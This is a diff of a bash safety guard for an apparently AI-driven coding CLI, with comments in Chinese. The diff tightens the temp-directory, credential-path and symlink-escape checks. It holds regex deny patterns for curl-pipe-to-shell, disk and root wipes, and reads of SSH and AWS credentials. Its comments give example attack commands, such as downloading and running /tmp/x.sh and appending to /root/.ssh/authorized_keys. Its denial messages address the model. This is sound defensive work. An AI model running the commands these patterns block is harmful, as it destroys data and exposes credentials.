@@ -2663,15 +2663,72 @@ norm_path() {
     printf '%s/%s%s' "${canon%/}" "$missing" "$base"
 }
 
-# 临时目录的"物理"前缀集合。必须归一:macOS 的 $TMPDIR 是 /var/folders/...,
+# ---------- 私有临时目录:TMPDIR 缺失或指向 1777 公共目录时接管 ----------
+# 自家有十余处 `mktemp "${TMPDIR:-/tmp}/…"`。macOS 上 TMPDIR 天然是
+# /var/folders/…/T/(按用户隔离、0700),没问题;但 Linux 上(容器 / CI / 非登录
+# ssh 会话)TMPDIR **经常根本没设**,于是这些调用全部落到 /tmp —— 一个同机任意
+# 用户都能列举内容、能在 1777 目录里抢注文件名的公共目录。
+# 本程序往临时目录里放的东西包括审批 prompt 全文、审计日志切片、会话正文片段、
+# 请求体 dump;含令牌的内容落在这里等于对本机广播。而且**这是豁免链主动放行的一条
+# 外泄路径**(临时目录在 P2 里先豁免,路径墙不会拦),所以它不属于"理论风险"。
+# 修法只在**这一处**动 TMPDIR,不改那十余个调用点:它们全写 `${TMPDIR:-/tmp}`,
+# export 之后自动跟着落进私有目录,子进程(curl/npm/gradle 都尊重 TMPDIR)同样受益。
+# 刻意只在"缺失/不可用/就是公共目录"时接管 —— 已有私有 TMPDIR 就不插手,
+# 免得把 macOS 的 /var/folders 换掉、也无谓改变子进程行为。
+_ct_tmp_is_public() {
+    local t="${TMPDIR:-}" tn
+    [[ -z "$t" || ! -d "$t" ]] && return 0
+    tn=$(cd "$t" 2>/dev/null && pwd -P) || return 0
+    case "$tn" in
+        /tmp|/private/tmp|/var/tmp|/private/var/tmp) return 0 ;;
+    esac
+    return 1
+}
+# 返回 0 = 已接管(并 export TMPDIR);返回 1 = 保持现状。
+# 失败时**完全不接管**而不是报错退出:宁可用公共 /tmp,也不要在启动路径上炸掉。
+auto_private_tmpdir() {
+    local pt="${HOME:-/tmp}/.ct/tmp"
+    _ct_tmp_is_public || return 1
+    mkdir -p "$pt" 2>/dev/null || return 1
+    # mkdir -p -m 700 的 -m 只作用于"本次新建"的那一级,父级已存在时不生效;
+    # 目录也可能早就存在但权限被放宽过,所以无条件再 chmod 一次。
+    chmod 700 "$pt" 2>/dev/null || return 1
+    TMPDIR="$pt"
+    export TMPDIR
+    return 0
+}
+# 必须判在 auto_tmp_prefixes 构建**之前**:数组是按"本机 TMPDIR 现在指哪"来归一的,
+# 改晚一步就会出现"TMPDIR 已是 ~/.ct/tmp、但豁免集合里还是 /tmp"——
+# 于是自家每次 mktemp 都撞 P2(而 P2 连 --allow-write 都放不开),当场自杀。
+auto_private_tmpdir
 # 而 pwd -P 会给出 /private/var/folders/...;用原始值做前缀比对会让所有临时文件
 # 撞上"系统路径 /private/*"这条硬墙(auto 模式下表现为连 mktemp 目录都写不了)。
+#
+# 候选清单是**跨平台并集**,取舍交给"本机有没有这个目录"(cd 失败即 continue),
+# 不写 uname 分支 —— 分支会让判据在非本机环境下永远没被执行过:
+#   /tmp      两平台都是临时目录(macOS 上它是 -> /private/tmp 的链接,归一后带 /private)
+#   /var/tmp  两平台都有(macOS 归一后是 /private/var/tmp;所以下面消费点的字面量
+#             "/var/tmp" 在 macOS 上是死项、"/private/tmp" 在 Linux 上是死项 ——
+#             两个死项不重叠,这才是那串字面量成对出现的原因,不是随手抄的)
+#   /dev/shm  **仅 Linux** 的公共临时目录(tmpfs + 1777,JVM/共享内存/构建工具默认写它)。
+#             macOS 上不存在 → 不入集合 → /dev/shm/* 照旧被 P2 的 /dev/* 拒,行为不变。
+#             刻意**不**把它加进下面两处字面量兜底:兜底是"数组因故为空时也别炸自家
+#             mktemp"的保险(自家 mktemp 全走 ${TMPDIR:-/tmp},不含 /dev/shm),
+#             写了就等于在 macOS 上凭空豁免一个 /dev 子路径。
+#   $TMPDIR   Linux 桌面/容器下可能指 /run/user/N(P2 新列了 /run/*,但豁免判在它
+#             之前,仍然放行;那边是 0700 私有目录,不存在 1777 抢注问题)
+# 去重:Linux 上 TMPDIR 通常未设 → 回落到 /tmp,与第一项物理同路径;不去重会让数组
+# 里出现两个 /tmp(判定无害,但数组长度类断言与审计输出会变脏)。
 auto_tmp_prefixes=()
-for _atp in /tmp /var/tmp "${TMPDIR:-/tmp}"; do
+for _atp in /tmp /var/tmp /dev/shm "${TMPDIR:-/tmp}"; do
     _atpc=$(cd "$_atp" 2>/dev/null && pwd -P) || continue
-    auto_tmp_prefixes+=("$_atpc")
+    _dup=0
+    for _seen in ${auto_tmp_prefixes[@]+"${auto_tmp_prefixes[@]}"}; do
+        [[ "$_seen" == "$_atpc" ]] && { _dup=1; break; }
+    done
+    (( _dup )) || auto_tmp_prefixes+=("$_atpc")
 done
-unset _atp _atpc
+unset _atp _atpc _dup _seen
 
 # 命中"用户启动时显式给的越界白名单"。mode: r(只读)/ rw(可写)
 auto_allow_hit() {
@@ -2736,14 +2793,39 @@ hd_re_priv="$hd_p"'(sudo|doas|pkexec|runuser|gksudo)([[:space:]]|$)'
 hd_re_su='(^|[[:space:];&|])su([[:space:]]+-[[:space:]]*[A-Za-z_][A-Za-z_]*|[[:space:]]+[A-Za-z_][A-Za-z_]*|[[:space:]]*$)'
 hd_re_pipe_exec='(curl|wget|fetch)[^;|]*\|[[:space:]]*(sudo[[:space:]]+)?(sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node)([^[:alnum:]_]|$)'
 hd_re_proc_sub='(sh|bash|zsh)[[:space:]]*<\(.*(curl|wget)'
-hd_re_dl_exec='(curl|wget)[^;|]*(-o[[:space:]]+|--output[[:space:]]+)[^[:space:]]+(&&|[[:space:]]+)(\./|/(usr|private/tmp|tmp)/|sh[[:space:]]|bash[[:space:]])'
-hd_re_wipe_root="$hd_p"'rm[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*[^;&|`$]*[[:space:]]*(/([[:space:]]|/?\*|$)|~/?$|~/|\$HOME(/|$)|/Users|/System|/Library|/private|/etc|/usr|/var|/bin|/sbin|/opt)'
+# 落盘到公共目录再执行。原式要求 `-o <值>` 后面**紧跟**分隔符再接执行段,但真实写法
+# 中间隔着 URL(`curl -o /tmp/x.sh http://e && bash /tmp/x.sh`) → 整条正则近乎永不
+# 命中(实测连自家表里的老正例都判 NP)。以前这个漏放被"落盘那一半会被 P2 拒"掩盖着,
+# 而 /tmp 系目录现在是**豁免**的,组合不再被拆开 —— 所以这行必须真修好,不能留着。
+# 修法:`[^[:space:]]+` 放宽成 `[^;&|]*`(允许吃掉 URL),同时把末段从"任意绝对路径"
+# 收紧成"执行动词 + 绝对路径",否则 `curl -o x.json api && npm ci && bash ./build.sh`
+# 这种正常构建会被误杀(H2 是永久拒,误杀的代价是教模型绕扫描器)。
+# 已知残留:不跨 `;` 连接(`curl -o /tmp/x.sh url; sh /tmp/x.sh` 仍漏)。刻意如此 ——
+# 把 `;` 也放进来会让"同串里两件不相干的事"大面积误伤,宁可留这一条并写在这里。
+# 两个平台的公共临时目录都要列:dev/shm 是本次新豁免的,它可写,所以更要拦执行。
+hd_re_dl_exec='(curl|wget)[^;&|]*(-o[[:space:]]+|--output[[:space:]]+|-O[[:space:]]+)[^;&|]*(&&|[[:space:]])[[:space:]]*(sh|bash|zsh|dash|ksh|source)[[:space:]]+/[[:graph:]]*'
+# /Users 与 /home 在"所有用户主目录的父级"这个语义上同构,必须同时列:
+# 只写 /Users 时,Linux 上 `rm -rf /home`(删掉全部用户家目录)连 H3 都不命中,
+# 只会走路径侧,而 /home 刻意不在 P2 名单 → 掉到可被 --allow-write 放开的 P3。
+hd_re_wipe_root="$hd_p"'rm[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*[^;&|`$]*[[:space:]]*(/([[:space:]]|/?\*|$)|~/?$|~/|\$HOME(/|$)|/Users|/home|/System|/Library|/private|/etc|/usr|/var|/bin|/sbin|/opt)'
 hd_re_wipe_flag='rm[[:space:]].*--no-preserve-root'
 hd_re_disk="$hd_p"'(dd[[:space:]][^;&|]*of=/dev/(rd|sd|nvme|disk|hd)|mkfs(\.[a-z0-9]+|[^[:alnum:]]|$)|diskutil[[:space:]]+(erase|reformat|partitionDisk|ck)|fdisk|newfs|diskpart|chflags[[:space:]]+[^[:space:]]*[[:space:]]+/)'
-hd_re_dotfile='(^|[[:space:];&|><]|-i[[:space:]]*|[[:alnum:]]-i)[[:space:]]*"?(~|/Users/[^/[:space:]]+|\$HOME)/\.(bashrc|bash_profile|bash_login|zshrc|zprofile|zshenv|profile|gitconfig|global\.gitignore|vimrc|gvimrc|inputrc|tmux\.conf|screenrc|ct)([[:space:]/]|$)'
-hd_re_dotfile_cfg='(~|/Users/[^/[:space:]]+|\$HOME)/\.config/([[:alnum:]-]+/(config|credentials)|gh/hosts)'
+# 家目录的绝对形态:macOS 是 `/Users/<name>`,Linux 是 `/home/<name>`。
+# 三条"读凭据"类正则共用这一个锚点,目的是让"漏了某个平台"这件事只可能在
+# 这一处发生(而不是散落在四条正则里各自缺一个分支)。之前只有 /Users 时,
+# Linux 上 `cat /home/bob/.ssh/id_rsa` 文本层完全不命中,而路径侧 P1 靠 $HOME
+# **只保护自己的家目录** —— 别人的家目录因此双侧漏判。
+# `/home/` 带尾斜杠,不会误伤 /homebrew、/homeless 这类前缀。
+hd_home='/Users/[^/[:space:]]+|/home/[^/[:space:]]+'
+hd_home_a="(~|${hd_home}|\\\$HOME)"
+# 三条正则都必须写成**单行 `=` 赋值**:回归表 harness 是用
+# `grep -E '^hd_...='` 抽赋值行再 eval 的,追加形式 `hd_re_dotfile+=` 不匹配那条
+# 正则(`+` 不在字符类里) → 只抽到前缀半截,判据"看着存在"、实际永远不命中,
+# 是最难发现的假绿。跨平台锚点靠同行内单/双引号交替拼进来,不拆行。
+hd_re_dotfile='(^|[[:space:];&|><]|-i[[:space:]]*|[[:alnum:]]-i)[[:space:]]*"?'"$hd_home_a"'/\.(bashrc|bash_profile|bash_login|zshrc|zprofile|zshenv|profile|gitconfig|global\.gitignore|vimrc|gvimrc|inputrc|tmux\.conf|screenrc|ct)([[:space:]/]|$)'
+hd_re_dotfile_cfg="$hd_home_a"'/\.config/([[:alnum:]-]+/(config|credentials)|gh/hosts)'
 # 凭据目录单独一条,且判在 dotfile 之前:规则号要能区分"读密钥"与"改配置"
-hd_re_secret_dir='(~|/Users/[^/[:space:]]+|\$HOME)/\.(ssh|aws|gnupg|subversion|docker|kube)([[:space:]/]|$)|(~|/Users/[^/[:space:]]+|\$HOME)/\.config/(gh|gcloud|azure)([[:space:]/]|$)|\.npmrc|\.netrc|_netrc|\.pypirc|\.htpasswd|\.pgpass|spnego-machine|(~|/Users/[^/[:space:]]+|\$HOME)/\.ct/(config|history)([[:space:]/]|$)'
+hd_re_secret_dir="$hd_home_a"'/\.(ssh|aws|gnupg|subversion|docker|kube)([[:space:]/]|$)|'"$hd_home_a"'/\.config/(gh|gcloud|azure)([[:space:]/]|$)|\.npmrc|\.netrc|_netrc|\.pypirc|\.htpasswd|\.pgpass|spnego-machine|'"$hd_home_a"'/\.ct/(config|history)([[:space:]/]|$)'
 hd_re_keychain="$hd_p"'security[[:space:]]+(dump-keychain|find-(generic|internet)-password|unlock-keychain)|keychain-access'
 # 私钥类要区分"文件"与"属性名":写成 `\.key([[:space:]]|$)` 会把
 # `jq .key file`、`obj.key = 1` 判成读私钥。所以扩展名形态一律要求前面有 "/"
@@ -2763,7 +2845,12 @@ hd_re_upload_arg='(-T[[:space:]]+|--upload-file|--data(-binary|-raw|-urlencode)?
 hd_re_secret_ref='(\$\(cat[^)]*(\.env|key|secret|token|password|passwd|credential|\.netrc|\.npmrc)|[<@][^[:space:]]*(\.env|secret|token|password|passwd|credential|\.netrc|\.npmrc|\.pypirc|\.htpasswd|\.pgpass|\.git-credentials|\.p8|[[:graph:]]*\.(key|pem))|(^|[[:space:]/~])\.env([[:space:]]|$)|(^|[[:space:]/~.$])(\.npmrc|\.netrc|\.pypirc|\.git-credentials|id_rsa|id_ed25519|[[:graph:]]*/[[:alnum:]_.-]*\.(env|pem|p12|key))([[:space:]]|$))'
 # tee 要在"行首或空白后"才算命令名(写成 [[:space:]]tee 会漏掉命令以 tee 开头的
 # 情况,如 `tee /etc/hosts < /tmp/x`)
-hd_re_sys_redirect='(>>?|(^|[[:space:]])tee([[:space:]]+-a)?[[:space:]]+)[[:space:]]*/(etc|usr|bin|sbin|System|Library|private|var/root|Applications)/'
+# 名单是**两平台并集**:proc/sys/run/boot/lib/lib64/srv/media/mnt 是 Linux 侧,
+# `root` 是 Linux 的 root 家目录(macOS 侧对应已有的 `var/root`,不写 root 就会漏掉
+# `echo k > /root/.ssh/authorized_keys` 这种最典型的提权写法)。
+# 刻意**不含 home/Users**:用户目录按"两侧同为 P3"的口径处理,写进这里会造成
+# 单侧加严(同一动作在 shell 侧撞 H11、在工具侧只落 P3)。
+hd_re_sys_redirect='(>>?|(^|[[:space:]])tee([[:space:]]+-a)?[[:space:]]+)[[:space:]]*/(etc|usr|bin|sbin|System|Library|private|var/root|Applications|proc|sys|run|boot|lib|lib64|root|srv|media|mnt)/'
 # 「丢弃型」重定向目标:写进 /dev 下这几个字符设备等于扔掉,不产生任何持久改动。
 # 与 hd_re_sys_redirect 的名单无关(那边刻意不含 /dev,所以 >/dev/null 不会撞 H11)。
 # 刻意不列 /dev/sd*、/dev/rdisk*、/dev/disk*:那是块设备,写进去是真毁数据(H4 管)。
@@ -3276,15 +3363,19 @@ hard_deny_cmd() {
     fi
     # H6 访问密钥/凭据(读+外发链路的源头)。工作目录内的 .env 属开发常规,
     # 不在本条之列,由外发规则 H10 兜。
-    # 刻意保守的两点(与路径侧 P1 配套,见 hard_deny_path):
-    #   1) `.npmrc`/`.netrc`/`.pypirc` 等按**文件名**命中,不限位置 —— 仓库里的项目级
-    #      .npmrc 同样常放 _authToken,所以工作目录内也不放过。代价:命令文本里出现
-    #      这些文件名就会被拦(含 `ls -l .npmrc` 这种只看元数据的形态)。
+    # 两条刻意约束(与路径侧 P1 配套,共用 in_root_exempt 那一份权威定义):
+    #   1) `.npmrc`/`.netrc`/`.pypirc` 等按**文件名**命中,但只对**边界外**的路径生效
+    #      —— 项目级 .npmrc 是包管理器的配置文件,与 package.json 同类,拦它不减少实际
+    #      风险(同目录 postinstall 能做同样的事),只会把用户推去手敲或换等价写法。
+    #      归一不了的那一段(`../../x/.npmrc`、看不懂的 $var)一律**不算边界内**,照拒。
     #   2) 只脱 echo/printf 的引号参数(hd_recheck_msg),不脱 cat/head/grep 的 ——
     #      那些动词的引号参数就是文件本身,脱了等于"加对引号就能绕过凭据墙"。
     if [[ "$c" =~ $hd_re_secret_dir || "$c" =~ $hd_re_keychain || "$c" =~ $hd_re_keyfile || "$c" =~ $hd_re_shadow ]] &&
        { ! declare -f hd_recheck_msg >/dev/null 2>&1 ||
-         hd_recheck_msg "$hd_re_secret_dir" "$hd_re_keychain" "$hd_re_keyfile" "$hd_re_shadow"; }; then
+         hd_recheck_msg "$hd_re_secret_dir" "$hd_re_keychain" "$hd_re_keyfile" "$hd_re_shadow"; } &&
+       # 全命令里命中的凭据路径**都**落在工作根内才脱开;有一条在外部或归一不了就照拒。
+       # 缺失判据函数时 `!{...}` 为真 → 照拒(fail-closed,与 T6 "缺辅助函数必须照拒"同规)
+       ! { declare -f hd_creds_all_exempt >/dev/null 2>&1 && hd_creds_all_exempt "$c"; }; then
         hd_rule="H6"; hd_msg="访问密钥/凭据文件(.npmrc/.netrc/.pypirc/私钥/凭据目录等)被拦:其内容会进上下文并随请求发给服务端。判定与档位无关,但出口有两条:auto 档直接拒(不提问),非 auto 档会向用户弹严格确认(必须逐字输入 yes,按回车/输入 y 都不算),放不放行由用户决定。换写法、拆分命令或重试都不会改变判定,也不要替用户作答;文件工具 read_file/list_dir 走 P1 同判。替代:请用户自己贴出所需的值;要查 registry 之类非敏感项用 npm config get registry(它不会把 token 打出来)"
         return 0
     fi
@@ -3365,10 +3456,146 @@ hard_deny_cmd() {
 # mode: r(读) / rw(写、改、删)。命中 → 返回 0 并填 hd_rule/hd_msg。
 # auto 模式下"工作目录外的写"本身就是硬墙(唯一例外是用户 --allow-write 名单);
 # 非 auto 模式下这条交给人工确认,不算硬墙。
+# 凭据**子目录**名单,路径侧 P1 与命令级 H6 共用同一份语义。
+# 必须是顶层 `hd_*=` 单行赋值:回归表 harness 靠 grep -E '^hd_...=' 抽赋值行。
+hd_cred_subdirs=('.ssh' '.aws' '.gnupg' '.azure' '.docker' '.kube' '.subversion' '.config/gh' '.config/gcloud' '.config/azure' '.ct/history' '.ct/config')
+# "他人家目录里的凭据目录"。补的是文件工具侧的半个洞:命令级 H6 早已按
+# `/Users/<n>|/home/<n>` + `.ssh/.aws/...` 拦读,但 hard_deny_path 的 P1 全用
+# "$HOME/.ssh"***前缀** —— 于是 read_file /home/bob/.aws/credentials 既不在
+# 凭据**文件名**名单(credentials 不是 .npmrc 那种专有名词),r 模式又不判 P2/P3,
+# 结果**完全放行**;而 read_file/list_dir 恰恰是模型最常走的通道。
+# 三条刻意约束:
+#   1) **不碰自己的家目录**($HOME 之下直接 return 1):那里由上面那份精确名单管。
+#      否则自己的工作目录常在 $HOME 下,`~/.config/<app>` 里放的项目配置会被永久拒。
+#   2) 只认"家目录**直属**层级"的 .xxx(trimmed 以 .ssh 等开头),与命令侧锚点
+#      `/Users/[^/ ]+/\.(ssh|…)` 同形 —— 别人项目里的 proj/.ssh 两侧都不拦,
+#      宁可一致地窄,也不要一侧宽一侧窄。
+#   3) 名单里的 `.azure` 比命令侧多一项(路径侧更严,单向可接受,见 T15 守卫)。
+hd_foreign_cred_path() {
+    local p="$1" s pre rest name me
+    # HOME 未设时(极端环境/子 shell)保守返回 1:不因此加严,免得把自己的一切当他人。
+    [[ -n "${HOME:-}" ]] || return 1
+    # 自己家目录下的路径交给上面那份精确名单 —— 只判"别人的家"。这里必须用
+    # **basename 比对**而不是 `"$p" == "$HOME"/*`:p 是归一后的路径,macOS 上
+    # `/home` 是 firmlink(归一成 /System/Volumes/Data/home),拿 $HOME 前缀比会失配。
+    me="${HOME##*/}"
+    local _found=0
+    for pre in '/Users/' '/home/'; do
+        [[ "$_found" == 1 ]] && break
+        case "$p" in
+            *"$pre"*)
+                rest="${p#*"$pre"}"          # 最短匹配:取第一个 pre 之后的内容
+                name="${rest%%/*}"
+                [[ -n "$name" && "$name" != "$rest" ]] || return 1   # 没有"用户名/…"这一层
+                [[ "$name" != "$me" ]] || return 1                   # 是自己 → 不加严
+                rest="${rest#*/}"            # 剥掉用户名,只留家目录**直属**层级往后
+                _found=1
+                ;;
+        esac
+    done
+    [[ "$_found" == 1 ]] || return 1
+    # 名单匹配限定在"家目录直属的下一段":proj/.ssh 这种别人项目里的同名目录
+    # 两侧都不拦(命令级锚点同样是家目录名后紧跟 .ssh),宁可一致地窄。
+    for s in ${hd_cred_subdirs[@]+"${hd_cred_subdirs[@]}"}; do
+        case "$rest" in
+            "$s"|"$s"/*) return 0 ;;
+        esac
+    done
+    return 1
+}
+# ==================== 信任边界的唯一权威定义 ====================
+# 一句话:**工作根 == 本会话被信任的范围**。归一后落在工作根内的路径,凭据名单
+# (P1 按文件名那一档)与系统/dotfile 写墙(P2/P3)都视为沙箱内;边界外的一切照旧。
+# 这条豁免原先散在三处各写各的(路径侧 P2 写块、path_access 的 1.5 步、命令侧 H6
+# 根本没有),三处口径互不一致 —— 后来者读任何一处都会以为看到了全部规则。现在三个
+# 谓词是唯一定义点,任何新增调用点都必须走它们(表里有静态守卫钉"不许再内联")。
+#
+# 两条边界条件(它们决定"什么时候这条豁免不成立",别记混):
+#   1) WORK_ROOT 就是 $HOME 或 /(把 CLI 直接跑在家目录下):"目录内"覆盖整台机器,
+#      前提消失,豁免整体失效 —— 于是 ~/.npmrc、~/.zshrc 又回到名单管控下。
+#   2) 末段是符号链接且真实落点在边界外:判定看链接名、写盘跟随真身,一条链接就能
+#      把整份名单穿过去(与临时目录那条 TMP 红线同形,只是方向相反),所以不豁免。
+# 反向的代价要说清:边界内的凭据文件确实可读可写了(项目级 .npmrc 是包管理器配置,
+# 与 package.json 同类)。同一目录里的 postinstall/CI 脚本本来就能做同样的事,单独拦
+# 它只换来假安全感;真正需要人盯的是"落点在边界外"和"边界被整台机器顶掉"这两件事。
+in_root_exempt() {
+    local np="$1"
+    [[ -n "$np" ]] || return 1                                  # 空路径不豁免(fail-closed)
+    [[ "$WORK_ROOT" != "$HOME" && "$WORK_ROOT" != "/" ]] || return 1
+    case "$np" in
+        "$WORK_ROOT"|"$WORK_ROOT"/*) return 0 ;;
+    esac
+    return 1
+}
+# 0 = 末段是已存在的符号链接,且逐跳解析后的真身落在工作根外(含解析不出来 —— 不知道
+# 就当在边界外)。1 = 不是链接 / 真身在边界内 / 路径还不存在(新建文件不受影响)。
+link_escapes_root() {
+    local np="$1" tgt i=0
+    [[ -L "$np" ]] || return 1
+    tgt="$np"
+    while [[ -L "$tgt" ]] && (( i < 8 )); do
+        tgt=$(readlink "$tgt" 2>/dev/null) || return 0          # 读不动链接 = 按逃逸处理
+        [[ -n "$tgt" ]] || return 0
+        [[ "$tgt" == /* ]] || tgt="$(dirname "$tgt")/$tgt"      # 相对链接按所在目录解析
+        i=$((i + 1))
+    done
+    tgt=$(norm_path "$tgt" 2>/dev/null) || tgt=""
+    [[ -n "$tgt" ]] || return 0
+    in_root_exempt "$tgt" && return 1
+    return 0
+}
+# 命令侧配套:H6 命中后,把**整段命中名单的那个词**逐个归一再问 in_root_exempt,
+# 全部在边界内才脱开。有一条在外部或归一不了(`../../x/.npmrc`、看不懂的 $var)照拒。
+# 坑(实测踩过,别改回去):不能用 `grep -oE "$re"` 抠匹配片段 —— 名单里 `.npmrc` 这类
+# 是无锚点分支,抠出来就只剩 `.npmrc`,拿它去归一会得到 `$WORK_ROOT/.npmrc`,于是
+# `cat ~/.npmrc` 被当成边界内相对路径放行 = fail-open。必须按**词**取上下文。
+hd_creds_all_exempt() {
+    local c="$1" w re t hit=0 m
+    declare -f resolve_path   >/dev/null 2>&1 || return 1       # 归一能力缺失 → 不豁免
+    declare -f in_root_exempt >/dev/null 2>&1 || return 1       # 边界谓词缺失 → 不豁免(T6 同源做法)
+    declare -f hd_split_words >/dev/null 2>&1 || return 1       # 分词缺失 → 整串不可信,不豁免
+    hd_split_words "$c"
+    for w in ${hd_words[@]+"${hd_words[@]}"}; do
+        w="${w//\"/}"; w="${w//\'/}"
+        [[ -n "$w" ]] || continue
+        m=0
+        for re in "${hd_re_secret_dir:-}" "${hd_re_keyfile:-}" "${hd_re_keychain:-}" "${hd_re_shadow:-}"; do
+            [[ -n "$re" ]] || continue
+            [[ "$w" =~ $re ]] && { m=1; break; }
+        done
+        (( m )) || continue
+        hit=1
+        # 只豁免**本身就是字面路径**的词。带 $() 反引号 ${ 括号 分号 重定向 通配 的词不是路径,
+        # 拿它去归一得到的结果毫无意义 —— 实测 `echo "$(cat ~/.npmrc)"` 分词后得到整段
+        # `$(cat ~/.npmrc)`,被拼成 `$PWD/$(cat ~/.npmrc)` 判成"边界内"并脱开 H6,
+        # 等于把命令替换里的凭据原样读进上下文 —— 正是 T8"命令替换不许被脱敏"要防的形态。
+        # 口径与 shell_note_grants 同源:那边不敢记账的词,这边同样不敢豁免。
+        case "$w" in
+            *'$'*|*'`'*|*';'*|*'|'*|*'&'*|*'<'*|*'>'*|*'('*|*')'*|*'*'*|*'?'*|*'{'*|*'}'*|*'\'*) return 1 ;;
+        esac
+        # 与 shell_note_grants 同一套展开:名单里带 ~/$HOME 锚点,不展就永远归一不出来
+        t="${w//\$\{HOME\}/$HOME}"; t="${t//\$HOME/$HOME}"; t="${t/#\~/$HOME}"; t="${t%/}"
+        [[ "$t" != *'~'* ]] || return 1            # ~ 只在开头有意义;出现在中间 = 没展成绝对路径 = 不豁免
+        [[ -n "$t" ]] || return 1
+        t=$(resolve_path "$t" 2>/dev/null) || return 1           # 归一不了 = 不知道 = 不算边界内
+        in_root_exempt "$t" || return 1
+    done
+    (( hit )) || return 1                                        # 一个都没抠出来 = 判不了 → 不豁免
+    return 0
+}
+
 hard_deny_path() {
     local p="$1" mode="${2:-r}" np
     hd_rule=""; hd_msg=""
     np=$(norm_path "$p") || np="$p"
+
+    # LINK 目录内特权的第一条例外:末段是链接、真身在边界外。必须排在**所有**豁免与
+    # 名单之前 —— 否则 `write_file $WORK_ROOT/.ssh` 会先被"目录内"放行,写盘却跟随
+    # 链接落到 ~/.ssh/...,等于用一条链接穿过整份名单(临时目录那条 TMP 红线同形)。
+    if in_root_exempt "$np" && link_escapes_root "$np"; then
+        hd_rule="LINK"; hd_msg="这个路径是符号链接,真实落点在工作目录外:路径判定看链接名、读写跟随链接真身,目录内豁免对它不成立(否则一条链接就能穿过整份凭据/dotfile 名单)。auto 档直接拒,非 auto 档须用户本人逐字输入 yes。替代:让用户把真实文件放进工作目录,或直接给出边界外的真实路径(那条会按它自己的规则重新判定)。换链接、换路径写法都不改变判定"
+        return 0
+    fi
 
     # P1 凭据类路径:读写都判硬墙,但放行出口只有"用户本人手输 yes"一条
     # (auto 档不提问直接拒;非 auto 档在调用点升级为严格人工确认)。列目录也算读。
@@ -3381,20 +3608,36 @@ hard_deny_path() {
             hd_rule="P1"; hd_msg="凭据/会话数据路径不可访问(~/.ct/history 存对话正文、~/.ct/config 含接口凭据):它会被读进上下文并随请求发给服务端。判定与档位无关,但出口有两条:auto 档直接拒(不提问),非 auto 档会向用户弹严格确认(必须逐字输入 yes),放不放行由用户决定。换写法、换路径表达或重试都不改变判定,也不要替用户作答;与 shell 的 H6 同判。替代:请用户自己贴出所需的值"
             return 0 ;;
     esac
-    # 凭据**文件名**判定,不限位置:仓库根的项目级 `.npmrc` 同样常放 _authToken,
-    # `$HOME` 之外放的 `.netrc`/私钥也一样。旧写法把 id_rsa 拿整串比(`[[ "$np" == id_rsa ]]`)
-    # 是条死分支 —— 绝对路径永不相等,嵌在 .ssh 之外的私钥全靠这一条才兜得住。
+    # 他人家目录下的凭据目录(与上面那份 $HOME 名单同源,见 hd_foreign_cred_path)。
+    # 只读也判、与档位无关,和 P1 其余分支同出口;刻意排在"凭据文件名"判定之前:
+    # 规则号都是 P1,但拒绝文案要说清是"别人的家目录"——写成"~/.xxx 被禁止"会让
+    # 用户以为是自己被误伤,转而去加 --allow-write(而 P1 根本放不开),白费一轮。
+    if hd_foreign_cred_path "$np"; then
+        hd_rule="P1"; hd_msg="另一个用户家目录下的凭据/会话目录(如 /home/<user>/.ssh、/Users/<user>/.aws)不可访问:不是本会话的工作目录,也不是你本人的配置。内容会进上下文并随请求发给服务端。判定与档位无关:auto 档直接拒,非 auto 档须用户本人逐字输入 yes。--allow-write 与换路径表达都放不开这条(P1 在任何名单判定之前),与 shell 的 H6 同判。替代:请用户自己贴出所需的值,或由用户在自己的终端里操作"
+        return 0
+    fi
+    # 凭据**文件名**判定:只对**边界外**的路径生效(见上面 in_root_exempt 的权威定义)。
+    # 口径变更说明:此前这条写的是"不限位置、含仓库里的项目级 .npmrc",而工具链从未
+    # 执行过它(resolve_path 判在目录内就直接放行,根本不调本函数)—— 于是要么维持
+    # "判据说拒、链路放行"的分裂,要么把口径统一到链路上。现在统一到边界:.npmrc 在
+    # 项目里是包管理器的配置文件,与 package.json/lockfile 同类,拦它不减少实际风险
+    # (同目录的 postinstall 能做同样的事),只逼人绕道或手敲。用户级 ~/.npmrc 仍在
+    # 名单内(它必然在边界外,除非工作根==家目录 —— 那时边界本身失效,见上面第 1 条)。
+    # 旧写法把 id_rsa 拿整串比(`[[ "$np" == id_rsa ]]`)是条死分支 —— 绝对路径永不相等,
+    # 嵌在 .ssh 之外的私钥全靠这一条才兜得住,这条保留原样。
     # 刻意不列 `.env`:工作目录内的 .env 属开发常规(H6 注释同口径),由外发规则 H10 兜。
     # `.pub` 不在名单里:公钥不是机密,拦它只会逼模型去绕。
-    case "${np##*/}" in
-        .npmrc|.netrc|_netrc|.pypirc|.git-credentials|.htpasswd|.pgpass|spnego-machine|\
-        id_rsa|id_dsa|id_ecdsa|id_ed25519)
-            hd_rule="P1"; hd_msg="凭据文件不可访问(按文件名判定,任何位置都算,含仓库里的项目级 .npmrc):内容会进上下文并随请求发给服务端。auto 档直接拒,非 auto 档会向用户弹严格确认(必须逐字输入 yes),放不放行由用户决定;换位置、换写法都不改变判定,与 shell 的 H6 同判。替代:请用户自己贴出所需的值;要查 registry 用 npm config get registry"
-            return 0 ;;
-    esac
-    if [[ "$np" == *.pem || "$np" == *.key || "$np" == *.p12 || "$np" == *.pfx || "$np" == id_rsa || "$np" == id_ed25519 || "$np" == id_ecdsa ]]; then
-        hd_rule="P1"; hd_msg="私钥/证书文件(.pem/.key/.p12/.pfx/id_rsa 等)不可访问,内容与凭据文件同判:auto 档直接拒,非 auto 档须用户本人逐字输入 yes 才放行。替代:请用户自己提供所需的值"
-        return 0
+    if ! in_root_exempt "$np"; then
+        case "${np##*/}" in
+            .npmrc|.netrc|_netrc|.pypirc|.git-credentials|.htpasswd|.pgpass|spnego-machine|\
+            id_rsa|id_dsa|id_ecdsa|id_ed25519)
+                hd_rule="P1"; hd_msg="工作目录外的凭据文件不可访问(按文件名判定:.npmrc/.netrc/.pypirc/.pgpass/.git-credentials/私钥等):内容会进上下文并随请求发给服务端。auto 档直接拒,非 auto 档会向用户弹严格确认(必须逐字输入 yes),放不放行由用户决定;换位置、换写法都不改变判定,与 shell 的 H6 同判。替代:请用户自己贴出所需的值;要查 registry 用 npm config get registry"
+                return 0 ;;
+        esac
+        if [[ "$np" == *.pem || "$np" == *.key || "$np" == *.p12 || "$np" == *.pfx || "$np" == id_rsa || "$np" == id_ed25519 || "$np" == id_ecdsa ]]; then
